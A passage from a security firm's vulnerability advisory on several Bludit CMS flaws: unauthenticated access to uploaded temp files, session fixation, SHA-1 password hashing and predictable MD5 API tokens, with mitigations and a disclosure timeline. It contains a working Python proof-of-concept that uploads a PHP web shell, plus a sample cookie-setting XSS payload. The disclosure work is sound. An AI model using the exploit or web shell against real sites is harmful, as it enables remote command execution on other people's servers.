</pre></td></tr></tbody></table></code></pre></div> <p>In case the uploaded file is a PHP file, unauthenticated visitors can access it under e.g. <code>http://&lt;target&gt;/bl-content/tmp/shell.php</code></p> <h3>Preconditions</h3> <p>To exploit this vulnerability, several preconditions must be met. First, the Bludit administrator must have enabled the API, as it is disabled by default. Additionally, the attacker needs to possess knowledge of the API token. However, it is important to note that authentication is not necessary to access the file upload directory.</p> <h3>Proof-of-Concept</h3> <div class=highlight><pre class="highlight python"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre></td><td class=rouge-code><pre><span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">def</span> <span class="nf">upload_image</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">api_token</span><span class="p">,</span> <span class="n">user_token</span><span class="p">,</span> <span class="n">file_name</span><span class="p">,</span> <span class="n">file_content</span><span class="p">):</span>
    <span class="n">boundary</span> <span class="o">=</span> <span class="s">"BOUNDARY_STRING"</span>

    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"Content-Type"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"multipart/form-data; boundary=</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
        <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">
Content-Disposition: form-data; name="token"

</span><span class="si">{</span><span class="n">api_token</span><span class="si">}</span><span class="s">
--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">
Content-Disposition: form-data; name="authentication"

</span><span class="si">{</span><span class="n">user_token</span><span class="si">}</span><span class="s">
--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">
Content-Disposition: form-data; name="uuid"

test
--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">
Content-Disposition: form-data; name="image"; filename="</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s">"
Content-Type: image/gif

</span><span class="si">{</span><span class="n">file_content</span><span class="si">}</span><span class="s">
--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">--"""</span>


    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/api/images"</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
        <span class="n">url</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
        <span class="n">data</span><span class="o">=</span><span class="n">data</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s">'{"status":"1","message":"Image extension not allowed."}'</span><span class="p">:</span>
        <span class="n">file_name</span> <span class="o">=</span> <span class="s">"shell.php"</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/bl-content/tmp/</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s">?cmd=id"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Error: Unexpected response from the server."</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">"Generate and send a POST request."</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--target"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Target URL (e.g., http://localhost:8000)"</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--api-token"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"API token"</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--user-token"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"User authentication token"</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="n">file_name</span> <span class="o">=</span> <span class="s">"shell.php"</span>
    <span class="n">file_content</span> <span class="o">=</span> <span class="s">"&lt;?php system($_GET['cmd']); ?&gt;"</span>

    <span class="n">upload_image</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">api_token</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">user_token</span><span class="p">,</span> <span class="n">file_name</span><span class="p">,</span> <span class="n">file_content</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div> <h3>Affected Versions</h3> <p>All Bludit versions since 3.9.0 beta 1 (released on 2019-05-18), including the most recent version 3.15.0 (as of 2024-06-15) are affected.</p> <h3>Suggested Mitigations and Countermeasures</h3> <ol> <li>Remove temporary folder from webroot: Ensure that the temporary file directory is relocated outside of the web root to prevent unauthorized access.</li> <li>Remove files from tmp folder even on negative checks: Implement a cleanup process to remove files from the temporary folder, regardless of whether the file extension check is positive or negative.</li> <li>Consolidate image upload code for AJAX requests: It should be noted that there is code for handling image uploads over AJAX (and not through the API) under <code>bl-kernel/ajax/profile-picture-upload.php</code>. This code is similar, but different to the API image upload code. For instance, the AJAX code for image uploads includes MIME type validation to provide an additional layer of security. It is advised to consolidate the code into a single location for easier maintenance and ensuring that it is consistent across different parts of the application.</li> </ol> <h2 id=cve-2024-24552-bludit>CVE-2024-24552: Bludit is Vulnerable to Session Fixation</h2> <p>A session fixation vulnerability in Bludit allows an attacker to bypass the server&rsquo;s authentication if they can trick an administrator or any other user into authorizing a session ID of their choosing.</p> <p><a href="https://www.first.org/cvss/v4.0/specification-document">CVSS v4.0</a> Score: 5.6 (MEDIUM)</p> <h3>Details</h3> <p>When users visit the admin login page under <code>/admin/</code>, the session cookie <code>BLUDIT-KEY=[...]; path=/</code> is set. This session cookie is not changed after signing in which means that the same value is used for privileged authenticated sessions. An attacker could perform an attack against an admin (or any other user with a Bludit account) as follows:</p> <ol> <li>Attacker tricks victim into using the attacker&rsquo;s session cookie. Although this scenario is very unlikely, this could happen, for instance, when the same browser is shared between attacker and victim. Quickly visiting the login page and exfiltrating the cookies&rsquo; value is sufficient for the attacker, thus this could happen while the victim&rsquo;s client machine is unlocked for a few moments. Alternatively, an attacker can use a cross-site scripting vulnerability (e.g. <code>&lt;script&gt;document.cookie=&quot;BLUDIT-KEY=[...]&quot;;&lt;/script&gt;</code>) to fix the session ID. <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-17229/product_id-41420/Bludit-Bludit.html">Multiple XSS vulnerabilities have been identified in Bludit in previous years</a>.</li> <li>Victim signs in under <code>/admin/</code>.</li> <li>Attacker can use the fixed session ID in their own browser and impersonate the victim.</li> </ol> <h3>Preconditions</h3> <p>To exploit this vulnerability, certain preconditions must be fulfilled. Firstly, the attacker needs a method to set the session cookie at least once. Additionally, the victim must login once the session cookie was fixed by the attacker. </p> <h3>Affected Versions</h3> <p>Most likely, all versions since the initial release of Bludit are affected from this vulnerability, including the most recent version 3.15.0 (as of 2024-06-15).</p> <h3>Suggested Mitigations and Countermeasures</h3> <p>Please refer to the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#renew-the-session-id-after-any-privilege-level-change">OWASP Session Management Cheatsheet</a>, in which solutions for session fixation are presented:</p> <blockquote> <p>The session ID must be renewed or regenerated by the web application after any privilege level change within the associated user session. The most common scenario where the session ID regeneration is mandatory is during the authentication process, as the privilege level of the user changes from the unauthenticated (or anonymous) state to the authenticated state though in some cases still not yet the authorized state. Common scenarios to consider include; password changes, permission changes, or switching from a regular user role to an administrator role within the web application. For all sensitive pages of the web application, any previous session IDs must be ignored, only the current session ID must be assigned to every new request received for the protected resource, and the old or previous session ID must be destroyed.</p> </blockquote> <h2 id=cve-2024-24553-bludit>CVE-2024-24553: Bludit uses SHA1 as Password Hashing Algorithm</h2> <p>Bludit uses the SHA-1 hashing algorithm to compute password hashes. Thus, attackers could determine cleartext passwords with brute-force attacks due to the inherent speed of SHA-1. In addition, the salt that is computed by Bludit is generated with a non-cryptographically secure function.</p> <p><a href="https://www.first.org/cvss/v4.0/specification-document">CVSS v4.0</a> Score: 5.9 (MEDIUM)</p> <h3>Details</h3> <p>The primary concern lies in the inherent speed of SHA-1, which makes it computationally efficient. Password hashing algorithms should be intentionally slow to increase the overhead for brute-force attacks, but SHA-1&rsquo;s efficiency undermines this crucial security principle. Additionally, Bludit utilizes a non-cryptographically secure method to generate password salts (<a href="https://www.php.net/manual/en/function.rand.php"><code>rand</code></a>), further exacerbating the security risk associated with user passwords.</p> <p>The combination of SHA-1 and a non-cryptographically secure method for generating password salts weakens the overall security of user passwords.</p> <p>The affected code was committed to the <a href="https://github.com/bludit/bludit/commit/1c0038bc552d7aa7d200ece53d397b295127569f#diff-84808c42468a9542f9ccd1eb2a310c4358f8ee04c93a9264778773dd1e7ea2f5R133">Git repository about 7 years ago</a>. </p> <div class=highlight><pre class="highlight php"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class=rouge-code><pre><span class="k">public</span> <span class="k">function</span> <span class="n">generatePasswordHash</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$salt</span><span class="p">)</span>
<span class="p">{</span>
        <span class="k">return</span> <span class="nb">sha1</span><span class="p">(</span><span class="nv">$password</span><span class="mf">.</span><span class="nv">$salt</span><span class="p">);</span>
<span class="p">}</span>

<span class="p">[</span><span class="mf">...</span><span class="p">]</span>

<span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="n">randomText</span><span class="p">(</span><span class="nv">$length</span><span class="p">)</span>
<span class="p">{</span>
         <span class="nv">$characteres</span> <span class="o">=</span> <span class="s2">"1234567890abcdefghijklmnopqrstuvwxyz!@#%^&amp;*"</span><span class="p">;</span>
         <span class="nv">$text</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
         <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$text</span> <span class="mf">.</span><span class="o">=</span> <span class="nv">$characteres</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">41</span><span class="p">)];</span>
         <span class="p">}</span>
         <span class="k">return</span> <span class="nv">$text</span><span class="p">;</span>
<span class="p">}</span>


<span class="p">[</span><span class="mf">...</span><span class="p">]</span>

<span class="k">public</span> <span class="k">function</span> <span class="n">generateSalt</span><span class="p">()</span>
<span class="p">{</span>
        <span class="k">return</span> <span class="nc">Text</span><span class="o">::</span><span class="nf">randomText</span><span class="p">(</span><span class="no">SALT_LENGTH</span><span class="p">);</span>
<span class="p">}</span>

<span class="p">[</span><span class="mf">...</span><span class="p">]</span>

<span class="nb">define</span><span class="p">(</span><span class="s1">'SALT_LENGTH'</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

<span class="p">[</span><span class="mf">...</span><span class="p">]</span>

<span class="nv">$row</span><span class="p">[</span><span class="s1">'salt'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">generateSalt</span><span class="p">();</span>
<span class="nv">$row</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">generatePasswordHash</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'salt'</span><span class="p">]);</span>
</pre></td></tr></tbody></table></code></pre></div> <h3>Affected Versions</h3> <p>All Bludit versions since 2.0 (released on 2017-10-16) are affected from this vulnerability, including the most recent version 3.15.0 (as of 2024-06-15). It should be noted, however, that previous versions of Bludit used similar weak password hashing methods.</p> <h3>Suggested Mitigations and Countermeasures</h3> <p>To address this vulnerability, it is imperative that the Bludit development team transitions to a more secure and intentionally slow hashing algorithm, such as bcrypt or Argon2, for password storage. These algorithms introduce the necessary computational overhead to resist brute-force attacks effectively. In addition, it is advised that appropriate cost factors are used. </p> <p>Furthermore, the generation of password salts should be revamped to employ a cryptographically secure method. The current approach, utilizing the <code>Text::randomText function</code>, should be replaced with a robust random number generator provided by the operating system or a dedicated cryptographic library. This change ensures the creation of unpredictable and secure salts, enhancing the overall resilience of the password storage mechanism.</p> <h2 id=cve-2024-24554-bludit>CVE-2024-24554: Bludit - Insecure Token Generation</h2> <p>Bludit uses predictable methods in combination with the MD5 hashing algorithm to generate sensitive tokens such as the API token and the user token. This allows attackers to authenticate against the Bludit API.</p> <p><a href="https://www.first.org/cvss/v4.0/specification-document">CVSS v4.0</a> Score: 6.0 (MEDIUM)</p> <h3>Details</h3> <p>Bludit relies on non-cryptographically secure methods to generate sensitive tokens. For instance, the API token, which is used in all requests against the Bludit API, is computed by taking the MD5 hash of the concatenated output of <code>uniqid()</code>, <code>time()</code>, and the website&rsquo;s domain. The affected code was committed to the <a href="https://github.com/bludit/bludit/commit/1f5dd3ac99284c44f7bb083625d81f6b75f0dc17#diff-51e713ebe4d6c558717bfbe91e829bc8e08f2fcfb9037fd196901dccbea30f51R7">Git repository about 7 years ago</a>.</p> <div class=highlight><pre class="highlight php"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class=rouge-code><pre><span class="k">public</span> <span class="k">function</span> <span class="n">init</span><span class="p">()</span>
<span class="p">{</span>
        <span class="c1">// Generate the API Token</span>
        <span class="nv">$token</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span> <span class="nb">uniqid</span><span class="p">()</span><span class="mf">.</span><span class="nb">time</span><span class="p">()</span><span class="mf">.</span><span class="no">DOMAIN</span> <span class="p">);</span>
<span class="p">[</span><span class="mf">...</span><span class="p">]</span>
</pre></td></tr></tbody></table></code></pre></div> <p>According to the <a href="https://www.php.net/manual/en/function.uniqid.php">PHP documentation</a>, <code>uniqid()</code> is a function that &ldquo;does not generate cryptographically secure values, and must not be used for cryptographic purposes, or purposes that require returned values to be unguessable.&rdquo; Apparently, the returned value is &ldquo;based on the current time in microseconds.&rdquo;</p> <p>Although the combination with <code>time()</code> and the website&rsquo;s domain makes exploiting this weakness more difficult at least to some degree, an attacker with enough resources is able to brute-force API tokens from feasible time ranges. This should be seen in context of previous Bludit vulnerabilities related to insufficient brute-force protection (e.g. <a href="https://www.cvedetails.com/cve/CVE-2019-17240/">CVE-2019-17240</a>).</p> <p>A similar problem is related to generating &ldquo;Auth Tokens&rdquo; which are required in a few API requests as additional parameters.</p> <div class=highlight><pre class="highlight php"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class=rouge-code><pre><span class="k">public</span> <span class="k">function</span> <span class="n">generateAuthToken</span><span class="p">()</span>
<span class="p">{</span>
        <span class="k">return</span> <span class="nb">md5</span><span class="p">(</span> <span class="nb">uniqid</span><span class="p">()</span><span class="mf">.</span><span class="nb">time</span><span class="p">()</span><span class="mf">.</span><span class="no">DOMAIN</span> <span class="p">);</span>
<span class="p">}</span>

<span class="p">[</span><span class="mf">...</span><span class="p">]</span>
</pre></td></tr></tbody></table></code></pre></div> <h3>Preconditions</h3> <p>It should be noted that the Bludit administrator must have enabled the API, as it is disabled by default.</p> <h3>Affected Versions</h3> <p>All Bludit versions since 2.0 (released on 2017-10-16) are affected from this vulnerability, including the most recent version 3.15.0 (as of 2024-06-15).</p> <h3>Suggested Mitigations and Countermeasures</h3> <p>Generating secure API and user auth tokens in PHP involves creating unique and cryptographically secure strings that can be used as tokens for authentication purposes. The following code snippet is a basic example of how to generate secure API tokens in PHP:</p> <div class=highlight><pre class="highlight php"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class=rouge-code><pre><span class="k">function</span> <span class="n">generateApiToken</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$token</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="nv">$length</span><span class="p">));</span>
    <span class="k">return</span> <span class="nv">$token</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div> <h2>Credits</h2> <ul> <li>Andreas Pfefferle, Redguard AG</li> </ul> <h2>Timeline</h2> <ul> <li>2024-01-24: Initial notification of the project maintainer via email. The email address was found on the Github profile of the maintainer, but was removed shortly after the initial notification.</li> <li>2024-01-25: Initial contact with NCSC as CNA of Switzerland to assign a CVE.</li> <li>2024-01-25: CVE-2024-24550, CVE-2024-24551, CVE-2024-24552, CVE-2024-24553, and CVE-2024-24554 reserved by NCSC.</li> <li>2024-01-25: Opened an issue in Github, asking the maintainer to contact us via email.</li> <li>2024-04-18: Contacted the maintainer again via comment in Github issue.</li> <li>2024-06-15: Informed the maintainer via email about the upcoming public vulnerability disclosure.</li> <li>2024-06-20: Public disclosure of this advisory.</li> </ul> <h2>About Redguard</h2> <p>Redguard is a Swiss-based information security company. We assist our clients with technical security testing as well as organizational security audits and consulting. This enables us to have a team with extensive experience in a wide variety of security relevant topics.</p> <ul> <li><a href="https://www.redguard.ch/">www.redguard.ch</a></li> <li><a href="mailto:contact@redguard.ch">contact@redguard.ch</a></li> </ul> <h2>Disclaimer</h2> <p>This document is not meant to be a complete list of security issues for any of the mentioned software and/or versions. It is possible, and indeed likely, that there are further security issues that are yet to be identified. The information in the advisory is believed to be accurate at the time of publishing, based on currently available information.</p> <p>Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties regarding this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.</p> </div> <br/><a href="javascript:history.back()">&lt; zurÃ¼ck</a> </div> </div> </div> </div> </div> <div id=footer-wrap> <footer class="footer footer-primary"> <div class=container> <div class="row gy-4"> <div class="col-6 col-md-3 col-lg-3"> <address class="text-center text-md-start"> <strong class=upper><a href="/offices/bern" alt="Office Bern">Bern</a></strong><br/> Redguard AG<br/> Laupenstrasse 18<br/> CH-3008 Bern </address> </div> <div class="col-6 col-md-3 col-lg-3"> <address class="text-center text-md-start"> <strong class=upper><a href="/offices/zurich" alt="Office Z&uuml;rich">Z&uuml;rich</a></strong><br/> Redguard AG<br/> Thurgauerstrasse 36/38<br/> CH-8050 Z&uuml;rich </address> </div> <div class="col-6 col-md-3 col-lg-3"> <address class="text-center text-md-start"> <strong class=upper><a href="/offices/neuenburg" alt="Office NeuchÃ¢tel">NeuchÃ¢tel</a></strong><br/> Redguard AG<br/> Pl. Numa-Droz 2<br/> CH-2000 NeuchÃ¢tel </address> </div> <div class="col-6 col-md-3 col-lg-3"> <nav class="social-media text-center text-md-start"> <a target=_blank href="https://www.xing.com/companies/redguardag" target=_blank alt="Redguard AG auf XING"> <img src="/images/icons/xing-1c5b4a96.png" alt="XING Logo"/> </a> <a target=_blank href="https://www.linkedin.com/company/redguard-ag" target=_blank alt="Redguard AG auf LinkedIn"> <img src="/images/icons/linked_in-b5693a11.png" alt="LinkedIn Logo"/> </a> <a target=_blank href="https://twitter.com/redguard_ch" target=_blank alt="Redguard AG auf X / Twitter"> <img src="/images/icons/x-64e27b98.png" alt="X / Twitter Logo"/> </a> </nav> <address class="text-center text-md-start"> <span class=hidden-xs>Phone: </span> +41 (0)31 511 37 50<br/> <span class=hidden-xs>E-Mail: </span> <a href="mailto:contact@redguard.ch">contact@redguard.ch</a><br/> <span class=hidden-xs>Abonnieren Sie unseren <a href="/newsletter">Newsletter</a></span> </address> </div> </div> </div> </footer> <footer class="footer footer-secondary"> <div class="container text-center text-md-start"> &copy; 2024 Redguard AG &#8729; <a href="/imprint" alt="Impressum<">Impressum</a> &#8729; <a href="/terms" alt=Datenschutz>Datenschutz</a> </div> </footer> </div> </body> </html>